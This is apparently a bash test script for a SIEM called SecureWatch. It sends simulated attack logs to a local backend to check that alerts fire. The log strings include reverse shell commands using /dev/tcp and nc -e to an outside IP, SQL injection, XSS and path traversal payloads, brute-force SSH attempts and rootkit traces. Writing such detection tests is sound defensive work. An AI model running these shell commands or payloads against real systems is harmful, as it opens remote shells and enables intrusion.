#!/bin/bash
# SecureWatch SIEM — Quick Test Script
# Turli xil hujumlarni simulyatsiya qiladi

BASE="http://localhost:8000"
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}================================================${NC}"
echo -e "${CYAN}  SecureWatch SIEM — Test Suite${NC}"
echo -e "${CYAN}================================================${NC}"

# ── 1. Login ─────────────────────────────────────────────────────────────────
echo -e "\n${YELLOW}[1] Logging in...${NC}"
TOKEN=$(curl -s -X POST "$BASE/api/auth/login" \
  -d "username=admin&password=admin123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

if [ -z "$TOKEN" ]; then
  echo -e "${RED}Login failed! Backend ishlaayaptimi? docker compose ps${NC}"
  exit 1
fi
echo -e "${GREEN}Login OK${NC}"

# ── 2. Agent ro'yxatdan o'tkazish ─────────────────────────────────────────
echo -e "\n${YELLOW}[2] Registering test agent...${NC}"
AGENT=$(curl -s -X POST "$BASE/api/agents/register" \
  -H "Content-Type: application/json" \
  -d '{
    "hostname": "test-server-01",
    "ip_address": "192.168.1.50",
    "os": "Linux",
    "os_version": "Ubuntu 22.04",
    "agent_version": "2.0.0"
  }')
AGENT_ID=$(echo $AGENT | python3 -c "import sys,json; print(json.load(sys.stdin)['agent_id'])")
echo -e "${GREEN}Agent ID: $AGENT_ID${NC}"

send_logs() {
  local label="$1"
  local logs="$2"
  echo -e "\n${YELLOW}$label${NC}"
  curl -s -X POST "$BASE/api/logs/ingest" \
    -H "Content-Type: application/json" \
    -d "{\"agent_id\": \"$AGENT_ID\", \"logs\": $logs}" | python3 -c "import sys,json; d=json.load(sys.stdin); print('  →', d.get('message','?'))"
}

# ── 3. Brute Force SSH (5+ marta) ─────────────────────────────────────────
send_logs "[3] Brute Force SSH — 7 ta failed login (CRITICAL alert kutiladi)" '[
  {"message": "Failed password for root from 185.220.101.1 port 54321 ssh2", "source": "sshd", "level": "ERROR"},
  {"message": "Failed password for root from 185.220.101.1 port 54322 ssh2", "source": "sshd", "level": "ERROR"},
  {"message": "Failed password for admin from 185.220.101.1 port 54323 ssh2", "source": "sshd", "level": "ERROR"},
  {"message": "Failed password for ubuntu from 185.220.101.1 port 54324 ssh2", "source": "sshd", "level": "ERROR"},
  {"message": "Failed password for user from 185.220.101.1 port 54325 ssh2", "source": "sshd", "level": "ERROR"},
  {"message": "Failed password for pi from 185.220.101.1 port 54326 ssh2", "source": "sshd", "level": "ERROR"},
  {"message": "Failed password for test from 185.220.101.1 port 54327 ssh2", "source": "sshd", "level": "ERROR"}
]'

sleep 1

# ── 4. Muvaffaqiyatli root login ─────────────────────────────────────────
send_logs "[4] Root login muvaffaqiyatli (HIGH alert)" '[
  {"message": "Accepted password for root from 185.220.101.1 port 54328 ssh2", "source": "sshd", "level": "WARNING"}
]'

# ── 5. SSH Invalid user ──────────────────────────────────────────────────
send_logs "[5] SSH Invalid user scan" '[
  {"message": "Invalid user admin123 from 89.248.167.131 port 41234", "source": "sshd"},
  {"message": "Invalid user oracle from 89.248.167.131 port 41235", "source": "sshd"},
  {"message": "Invalid user ftpuser from 89.248.167.131 port 41236", "source": "sshd"}
]'

# ── 6. Sudo escalation ────────────────────────────────────────────────────
send_logs "[6] Sudo command (privilege escalation)" '[
  {"message": "sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/bin/bash", "source": "sudo"},
  {"message": "sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/passwd root", "source": "sudo"}
]'

# ── 7. FIM — fayl o'zgarishi ──────────────────────────────────────────────
send_logs "[7] FIM — critical file modified (CRITICAL alert)" '[
  {"message": "FIM ALERT: File MODIFIED: /etc/passwd | old=abc123... new=def456...", "source": "fim", "level": "CRITICAL"},
  {"message": "FIM ALERT: File MODIFIED: /etc/shadow | old=111aaa... new=222bbb...", "source": "fim", "level": "CRITICAL"}
]'

# ── 8. Rootkit indicator ──────────────────────────────────────────────────
send_logs "[8] Rootkit indicator (CRITICAL)" '[
  {"message": "ROOTCHECK [ROOTKIT_FILE]: Known rootkit file found: /usr/bin/.sshd (size=45232)", "source": "rootcheck", "level": "CRITICAL"},
  {"message": "ROOTCHECK [LD_PRELOAD]: /etc/ld.so.preload contains: /usr/lib/libprocesshider.so", "source": "rootcheck", "level": "CRITICAL"}
]'

# ── 9. Reverse shell attempt ──────────────────────────────────────────────
send_logs "[9] Suspicious process — reverse shell (CRITICAL)" '[
  {"message": "SUSPICIOUS process: [4521] bash cmd=bash -i >& /dev/tcp/185.220.101.1/4444 0>&1", "source": "process_monitor", "level": "CRITICAL"},
  {"message": "SUSPICIOUS process: [4522] nc cmd=nc -e /bin/bash 185.220.101.1 4444", "source": "process_monitor", "level": "CRITICAL"}
]'

# ── 10. Web attack ────────────────────────────────────────────────────────
send_logs "[10] Web application attack (SQL injection)" '[
  {"message": "192.168.1.100 - - [17/Apr/2026:10:23:45] \"GET /login?id=1 UNION SELECT username,password FROM users-- HTTP/1.1\" 200 1234", "source": "nginx"},
  {"message": "192.168.1.100 - - [17/Apr/2026:10:23:46] \"GET /search?q=<script>alert(1)</script> HTTP/1.1\" 400 512", "source": "nginx"},
  {"message": "192.168.1.100 - - [17/Apr/2026:10:23:47] \"GET /../../../../etc/passwd HTTP/1.1\" 403 256", "source": "nginx"}
]'

# ── 11. UFW firewall blocks ───────────────────────────────────────────────
send_logs "[11] Firewall blocks (port scan simulatsiya)" '[
  {"message": "[UFW BLOCK] IN=eth0 OUT= SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP SPT=45123 DPT=22", "source": "kernel"},
  {"message": "[UFW BLOCK] IN=eth0 OUT= SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP SPT=45124 DPT=3306", "source": "kernel"},
  {"message": "[UFW BLOCK] IN=eth0 OUT= SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP SPT=45125 DPT=5432", "source": "kernel"},
  {"message": "[UFW BLOCK] IN=eth0 OUT= SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP SPT=45126 DPT=6379", "source": "kernel"},
  {"message": "[UFW BLOCK] IN=eth0 OUT= SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP SPT=45127 DPT=27017", "source": "kernel"},
  {"message": "[UFW BLOCK] IN=eth0 OUT= SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP SPT=45128 DPT=9200", "source": "kernel"},
  {"message": "[UFW BLOCK] IN=eth0 OUT= SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP SPT=45129 DPT=8080", "source": "kernel"},
  {"message": "[UFW BLOCK] IN=eth0 OUT= SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP SPT=45130 DPT=443", "source": "kernel"},
  {"message": "[UFW BLOCK] IN=eth0 OUT= SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP SPT=45131 DPT=21", "source": "kernel"},
  {"message": "[UFW BLOCK] IN=eth0 OUT= SRC=94.102.49.190 DST=10.0.0.1 PROTO=TCP SPT=45132 DPT=23", "source": "kernel"}
]'

# ── 12. OOM killer ────────────────────────────────────────────────────────
send_logs "[12] OOM Killer triggered" '[
  {"message": "Out of memory: Kill process 12345 (java) score 987 or sacrifice child", "source": "kernel", "level": "CRITICAL"}
]'

# ── 13. Service crash ─────────────────────────────────────────────────────
send_logs "[13] Service crash (segfault)" '[
  {"message": "nginx[3421]: segfault at 0 ip 00007f3c2d4a1234 sp 00007fff5abc error 4", "source": "kernel", "level": "ERROR"},
  {"message": "systemd[1]: nginx.service: Main process exited, code=killed, status=11/SEGV", "source": "systemd"}
]'

# ── 14. New user created ──────────────────────────────────────────────────
send_logs "[14] New user account created" '[
  {"message": "useradd: new user: name=hacker, UID=1337, GID=1337, home=/home/hacker, shell=/bin/bash", "source": "useradd", "level": "WARNING"}
]'

# ── 15. System metrics ────────────────────────────────────────────────────
send_logs "[15] System metrics (high CPU)" '[
  {"message": "CPU=96%(4cores) | MEM=89%(7.1GB/8.0GB) | SWAP=45% | DISK=72% | NET=↑234MB↓1024MB | PROCS=342 | CONNS=45est/8listen | ALERTS=CPU critical: 96%|Memory high: 89%", "source": "system_metrics", "level": "CRITICAL",
   "parsed_fields": {"event_type": "system_metrics", "cpu_percent": 96, "memory_percent": 89, "disk_percent": 72}}
]'

# ── Natijalar ─────────────────────────────────────────────────────────────
echo -e "\n${CYAN}================================================${NC}"
echo -e "${CYAN}  Natijalarni tekshirish...${NC}"
echo -e "${CYAN}================================================${NC}"

sleep 2

ALERTS=$(curl -s "$BASE/api/alerts?size=50" \
  -H "Authorization: Bearer $TOKEN" | \
  python3 -c "
import sys,json
d=json.load(sys.stdin)
alerts=d.get('alerts',[])
print(f'  Jami alertlar: {d.get(\"total\",0)}')
by_sev={'CRITICAL':0,'HIGH':0,'MEDIUM':0,'LOW':0}
for a in alerts:
    s=a.get('severity','')
    by_sev[s]=by_sev.get(s,0)+1
for s,c in by_sev.items():
    if c: print(f'  {s}: {c}')
print()
for a in alerts[:8]:
    m=a.get('mitre_tactic') or ''
    t=a.get('mitre_technique') or ''
    mitre=f'[{t}]' if t else ''
    print(f'  [{a[\"severity\"]:8}] lvl={a.get(\"level\",\"?\")} {a[\"title\"][:45]:45} {mitre}')
")
echo -e "$ALERTS"

echo -e "\n${GREEN}Test tugadi!${NC}"
echo -e "Dashboard: ${CYAN}http://localhost:8080${NC}"
echo -e "Alerts:    ${CYAN}http://localhost:8080/alerts${NC}"
